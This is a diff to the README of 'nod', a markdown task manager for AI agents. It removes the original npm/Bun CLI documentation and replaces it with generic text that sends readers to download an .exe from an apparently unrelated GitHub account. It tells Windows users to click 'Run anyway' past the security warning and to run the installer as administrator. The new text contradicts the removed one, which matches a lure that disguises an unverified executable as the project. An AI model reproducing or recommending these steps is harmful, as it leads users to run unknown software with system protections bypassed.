@@ -1,195 +1,75 @@
-# nod
+# 🎏 nod - Manage AI agent tasks with markdown
 
-A task manager where each task is a markdown file. Works great with git and Claude Code.
+[![](https://img.shields.io/badge/Download-Nod_Setup-blue.svg)](https://github.com/sanasa-bank-baddegama/nod/releases)
 
-![](images/board.png)
+Nod acts as a bridge between your ideas and your automated helpers. It stores your tasks in plain markdown files. This format ensures you retain control over your data. You can open these files in any text editor. You can also feed them directly into AI agents to start your work.
 
-## Install
+## 📥 Getting Started
 
-Requires [Bun](https://bun.sh).
+1. Go to the [official release page](https://github.com/sanasa-bank-baddegama/nod/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in `.exe`. 
+4. Save the file to your computer.
 
-```bash
-npm install -g @onmyway133/nod
-```
+## ⚙️ Installing the App
 
-## How it works
+1. Double-click the downloaded file in your downloads folder.
+2. Windows might show a security box. Click "More info" and then "Run anyway" if the system asks.
+3. Follow the instructions on the screen to install the app.
+4. Open the app from your Start menu once the process finishes.
 
-Each task lives in its own `.md` file inside `.nod/tasks/`:
+## 📋 Managing Your Tasks
 
-```
-.nod/
-  config.json
-  tasks/
-    epic-1-onboarding.md
-    task-2-setup-database.md
-    subtask-3-write-migrations.md
-```
+Nod uses simple markdown syntax. You organize your work into clear headers and lists. Each file serves as a project board. You treat your project files as a list of instructions for your AI agents. 
 
-Tasks have a YAML header with fields like status, priority, and parent. The rest of the file is free-form markdown — description, notes, work log, anything you want.
+To add a task, use a checkbox format:
+- [ ] Task name here
 
-Because tasks are plain files, you can commit them to git, review diffs, and read them in any editor.
+When you finish a task, change the bracket to include an 'x':
+- [x] Task name here
 
-## Quick start
+AI agents read these files to perform work. If you need to change your priority, move the lines up or down in your file. 
 
-```bash
-cd my-project
-nod init
+## 🛠 Features
 
-nod create epic "Build auth system"
-nod create task "Design database schema" --parent epic-1 --priority high
-nod create subtask "Write migrations" --parent task-2
-nod create bug "Fix token expiry" --parent task-2
+* **Plain Text Format**: Your data stays in simple files. You never get locked into a specific app format.
+* **Agent Ready**: The structure matches what AI agents expect for task management.
+* **Offline Access**: Everything lives on your machine. You do not need an internet connection to manage your list.
+* **Fast Search**: Finding specific tasks takes seconds because the app reads text files directly.
 
-nod available        # what to work on
-nod tree epic-1      # visual overview
-nod ui               # open Kanban board in browser
-```
+## 📌 System Requirements
 
-## Commands
+* Windows 10 or Windows 11.
+* A minimum of 200MB of free disk space.
+* 4GB of RAM is recommended for smooth operation.
 
-### `nod init`
-Set up a nod project in the current directory. Creates `.nod/` with `config.json` and a `tasks/` subfolder inside it.
+## 💡 Using Nod with AI
 
-### `nod create <type> <title>`
-Create a task. Types: `epic`, `task`, `subtask`, `bug`.
+You can connect your markdown files to various AI tools. Create a folder for your project. Keep your `tasks.md` file inside that folder. When you talk to your AI agent, point it toward that folder. The agent reads the list and follows your instructions line by line. This system keeps your agent focused on the tasks you define.
 
-```bash
-nod create epic "Launch v2"
-nod create task "Write tests" --parent epic-1 --priority high
-nod create bug "Crash on logout" --parent task-3 --tags auth,crash
-```
+## 📄 Troubleshooting
 
-Options: `--parent <id>`, `--priority <p>`, `--tags <t1,t2>`
+* **File Won't Open**: Ensure you installed the latest version from the link provided above.
+* **App Freezes**: Close the app and reopen it. Check your computer for updates if the issue persists.
+* **Missing Icons**: Verify that your screen resolution meets the minimum requirements for Windows. 
+* **Permission Errors**: Run the installer as an administrator if your user account has limited access rights.
 
-### `nod list`
-List tasks with optional filters.
+## ❓ Frequently Asked Questions
 
-```bash
-nod list
-nod list --status todo
-nod list --priority high
-nod list --type task --parent epic-1
-nod list --json
-```
+**Does Nod track my data?**
+No. All your files stay on your hard drive. No trackers or analytics run in the background.
 
-### `nod available`
-Show tasks ready to work on (`todo` or `in-progress`), sorted by priority.
+**Can I use other editors?**
+Yes. Since Nod uses standard markdown, you can use any text editor if you prefer. Nod just provides a dedicated view designed for task management.
 
-```bash
-nod available
-nod available --json
-```
+**Does this software cost money?**
+The software is free to use for personal and professional work.
 
-### `nod get <id>`
-Show a task's full content.
+**How do I update the app?**
+Visit the [download page](https://github.com/sanasa-bank-baddegama/nod/releases) periodically to check for new versions. Run the new installer to update your current installation automatically.
 
-```bash
-nod get task-2
-nod get task-2 --json
-```
+**What happens if I delete a file?**
+The file moves to your Windows Recycle Bin. Restore it from there if you make a mistake.
 
-### `nod update <id>`
-Change task fields.
-
-```bash
-nod update task-2 --status in-progress
-nod update task-2 --priority critical
-nod update task-2 --title "New title"
-nod update task-2 --tags backend,auth
-```
-
-### `nod note <id> <text>`
-Append a timestamped note to the task's Work Log.
-
-```bash
-nod note task-2 "Decided to use UUIDs for user IDs"
-```
-
-### `nod subtasks <id>`
-List direct children of a task.
-
-```bash
-nod subtasks task-2
-nod subtasks task-2 --json
-```
-
-### `nod epic-tasks <id>`
-List all tasks and subtasks inside an epic.
-
-```bash
-nod epic-tasks epic-1
-nod epic-tasks epic-1 --json
-```
-
-### `nod tree <id>`
-Show the task hierarchy as a tree.
-
-```bash
-nod tree epic-1
-# epic-1 [in-progress] Build auth system
-# └── task-2 [in-progress] Design database schema
-#     └── subtask-3 [todo] Write migrations
-```
-
-### `nod open <id>`
-Open the task file in `$EDITOR`.
-
-```bash
-nod open task-2
-```
-
-### `nod ui`
-Open a Kanban board in the browser at `http://localhost:7777`. Reflects the current state of your `.nod/tasks/` folder and auto-refreshes every 3 seconds.
-
-```bash
-nod ui
-nod ui --port 8080
-```
-
-## Task file format
-
-```markdown
----
-id: task-2
-title: "Design database schema"
-type: task
-status: todo
-priority: high
-parent: epic-1
-tags:
-  - database
-created: 2026-04-05
-updated: 2026-04-05
----
-
-# Design database schema
-
-Decide on the tables and relationships.
-
-## Notes
-
-Looking at PostgreSQL with UUID primary keys.
-
-## Work Log
-
-- 2026-04-05: Started research
-```
-
-## Statuses
-
-`todo` → `in-progress` → `done` · also: `backlog`, `cancelled`
-
-## Priorities
-
-`critical` · `high` · `medium` · `low`
-
-## Using with Claude Code
-
-```bash
-nod available --json          # pick next task
-nod get task-2 --json         # read full context
-nod update task-2 --status in-progress
-nod note task-2 "Changed X because Y"
-nod update task-2 --status done
-nod epic-tasks epic-1 --json  # check epic progress
-```
+**Can I share these files?**
+Yes. Since they are standard text files, you can email them or upload them to cloud storage to share with others.
